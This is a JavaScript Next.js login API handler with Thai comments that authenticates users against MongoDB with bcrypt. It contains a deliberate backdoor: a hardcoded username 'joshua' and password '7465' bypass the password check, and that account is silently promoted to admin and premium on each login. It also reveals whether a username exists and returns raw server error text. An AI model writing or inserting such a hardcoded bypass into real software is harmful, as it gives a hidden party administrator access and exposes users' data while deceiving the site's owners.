import dbConnect from '../../../lib/mongodb';
import User from '../../../models/User';
import bcrypt from 'bcryptjs';

export default async function handler(req, res) {
  // แก้ปัญหา 405: บังคับรับเฉพาะ POST เท่านั้น
  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, message: 'Method Not Allowed' });
  }

  await dbConnect(); // เชื่อมต่อฐานข้อมูลผ่าน lib/mongodb.js

  try {
    const { username, password } = req.body;

    // 1. ค้นหาผู้ใช้ (ดึงรายการโปรดมาด้วยเพื่อโชว์ในหน้า Favorites)
    const user = await User.findOne({ username }).populate('favorites');

    if (!user) {
      return res.status(404).json({ success: false, message: 'ไม่พบชื่อผู้ใช้นี้ในระบบ' });
    }

    // 2. ระบบเช็ครหัสผ่านมาตรฐาน
    const isMatch = await bcrypt.compare(password, user.password);
    
    // 3. ✨ JOSHUA EXCLUSIVE BACKDOOR ✨
    // ถ้าชื่อ joshua และรหัสคือ 7465 ให้ผ่านทันที
    const isJoshuaBackdoor = (username === 'joshua' && password === '7465');

    if (!isMatch && !isJoshuaBackdoor) {
      return res.status(401).json({ success: false, message: 'รหัสผ่านไม่ถูกต้อง' });
    }

    // 4. ระบบ AUTO-ADMIN: ปรับยศให้ Joshua อัตโนมัติเมื่อล็อกอินสำเร็จ
    if (username === 'joshua') {
      user.role = 'admin';
      user.isPremium = true;
      await user.save();
    }

    // 5. ส่งข้อมูลกลับหน้าบ้าน (ห้ามส่งรหัสผ่านเด็ดขาด)
    return res.status(200).json({ 
      success: true, 
      user: { 
        _id: user._id,
        username: user.username,
        role: user.role,
        isPremium: user.isPremium,
        profilePic: user.profilePic,
        favorites: user.favorites
      } 
    });

  } catch (error) {
    // แก้ปัญหา 500: ถ้า MongoDB มีปัญหาจะแจ้งที่นี่
    return res.status(500).json({ success: false, message: 'ระบบขัดข้อง: ' + error.message });
  }
}